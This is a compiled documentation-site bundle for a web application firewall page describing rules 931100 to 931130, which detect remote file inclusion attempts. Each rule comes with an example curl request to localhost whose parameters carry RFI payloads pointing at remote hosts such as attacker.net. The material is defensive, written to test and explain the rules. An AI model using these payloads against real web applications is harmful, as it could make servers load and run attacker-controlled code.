"use strict";(self.webpackChunkquant_docs=self.webpackChunkquant_docs||[]).push([[6700],{3905:function(e,t,r){r.d(t,{Zo:function(){return u},kt:function(){return f}});var n=r(7294);function a(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function l(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function o(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?l(Object(r),!0).forEach((function(t){a(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):l(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function i(e,t){if(null==e)return{};var r,n,a=function(e,t){if(null==e)return{};var r,n,a={},l=Object.keys(e);for(n=0;n<l.length;n++)r=l[n],t.indexOf(r)>=0||(a[r]=e[r]);return a}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(n=0;n<l.length;n++)r=l[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var s=n.createContext({}),c=function(e){var t=n.useContext(s),r=t;return e&&(r="function"==typeof e?e(t):o(o({},t),e)),r},u=function(e){var t=c(e.components);return n.createElement(s.Provider,{value:t},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},m=n.forwardRef((function(e,t){var r=e.components,a=e.mdxType,l=e.originalType,s=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),p=c(r),m=a,f=p["".concat(s,".").concat(m)]||p[m]||d[m]||l;return r?n.createElement(f,o(o({ref:t},u),{},{components:r})):n.createElement(f,o({ref:t},u))}));function f(e,t){var r=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var l=r.length,o=new Array(l);o[0]=m;var i={};for(var s in t)hasOwnProperty.call(t,s)&&(i[s]=t[s]);i.originalType=e,i[p]="string"==typeof e?e:a,o[1]=i;for(var c=2;c<l;c++)o[c]=r[c];return n.createElement.apply(null,o)}return n.createElement.apply(null,r)}m.displayName="MDXCreateElement"},6961:function(e,t,r){r.r(t),r.d(t,{assets:function(){return u},contentTitle:function(){return s},default:function(){return f},frontMatter:function(){return i},metadata:function(){return c},toc:function(){return p}});var n=r(7462),a=r(3366),l=(r(7294),r(3905)),o=["components"],i={title:"Core Ruleset: 931xxx",sidebar_label:"931xxx"},s=void 0,c={unversionedId:"security/waf/crs/931",id:"security/waf/crs/931",title:"Core Ruleset: 931xxx",description:"Rules with the 931xxx prefix protect web applications from remote file inclusion attempts that can be made by attackers.",source:"@site/docs/security/waf/crs/931.md",sourceDirName:"security/waf/crs",slug:"/security/waf/crs/931",permalink:"/ConquerIO/docs/security/waf/crs/931",draft:!1,editUrl:"https://github.com/quantcdn/docs/tree/develop/docs/security/waf/crs/931.md",tags:[],version:"current",frontMatter:{title:"Core Ruleset: 931xxx",sidebar_label:"931xxx"},sidebar:"someSidebar",previous:{title:"930xxx",permalink:"/ConquerIO/docs/security/waf/crs/930"},next:{title:"932xxx",permalink:"/ConquerIO/docs/security/waf/crs/932"}},u={},p=[{value:"Paranoia Level 1 (default)",id:"paranoia-level-1-default",level:2},{value:"Paranoia Level 2",id:"paranoia-level-2",level:2},{value:"Paranoia Level 3",id:"paranoia-level-3",level:2},{value:"Paranoia Level 4",id:"paranoia-level-4",level:2}],d={toc:p},m="wrapper";function f(e){var t=e.components,r=(0,a.Z)(e,o);return(0,l.kt)(m,(0,n.Z)({},d,r,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("p",null,"Rules with the 931xxx prefix protect web applications from remote file inclusion attempts that can be made by attackers."),(0,l.kt)("h2",{id:"paranoia-level-1-default"},"Paranoia Level 1 (default)"),(0,l.kt)("details",null,(0,l.kt)("summary",{id:"931100"},"Rule: 931100"),(0,l.kt)("p",null,"Protects web applications from directory traversal attacks. This will inspect request args, headers and files to ensure that no directory traversal attempts are made by the client."),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"Message:")," ",(0,l.kt)("inlineCode",{parentName:"p"},"Possible Remote File Inclusion (RFI) Attack: URL Parameter using IP Address")),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"Example:")),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"curl --request GET \\\n  --url 'http://localhost:8088/?q=https%3A%2F%2F1.1.1.1%2Findex.php'\n"))),(0,l.kt)("details",null,(0,l.kt)("summary",{id:"931110"},"Rule: 931110"),(0,l.kt)("p",null,"Prevents the use of include statements in a request payload."),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"Message:")," ",(0,l.kt)("inlineCode",{parentName:"p"},"Possible Remote File Inclusion (RFI) Attack: Common RFI Vulnerable Parameter Name used w/URL Payload")),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"Example:")),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"curl --request GET \\\n  --url 'http://localhost:8088/?q=include(%22ftp%3A%2F%2F1.1.1.1%2Ftest.php%22)'\n"))),(0,l.kt)("details",null,(0,l.kt)("summary",{id:"931120"},"Rule: 931120"),(0,l.kt)("p",null,"Restricts the use of file protocols with a dangling question mark. This can be used by an attacker to trick a web server into including a file from a remote location."),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"Message:")," ",(0,l.kt)("inlineCode",{parentName:"p"},"Possible Remote File Inclusion (RFI) Attack: URL Payload Used w/Trailing Question Mark Character (?)")),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"Example:")),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"curl --request GET \\\n  --url 'http://localhost:8088/?q=https%3A%2F%2Fattacker.net%2Ftest.php%3F'\n"))),(0,l.kt)("h2",{id:"paranoia-level-2"},"Paranoia Level 2"),(0,l.kt)("details",null,(0,l.kt)("summary",{id:"931130"},"Rule: 93113  0"),(0,l.kt)("p",null,"Some application packages will implicitly interpret ",(0,l.kt)("inlineCode",{parentName:"p"},"url:file://")," as a local address and include them without checking existence locally."),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"Message:")," ",(0,l.kt)("inlineCode",{parentName:"p"},"Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link")),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"Example:")),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"curl --request GET \\\n  --url 'http://localhost:8088/?q=uri%3Ahttps%3A%2F%2Fattacker.net%2Ffile.jar'\n"))),(0,l.kt)("h2",{id:"paranoia-level-3"},"Paranoia Level 3"),(0,l.kt)("p",null,"This module does not define checks for paranoia level 3."),(0,l.kt)("h2",{id:"paranoia-level-4"},"Paranoia Level 4"),(0,l.kt)("p",null,"This module does not define checks for paranoia level 4."))}f.isMDXComponent=!0}}]);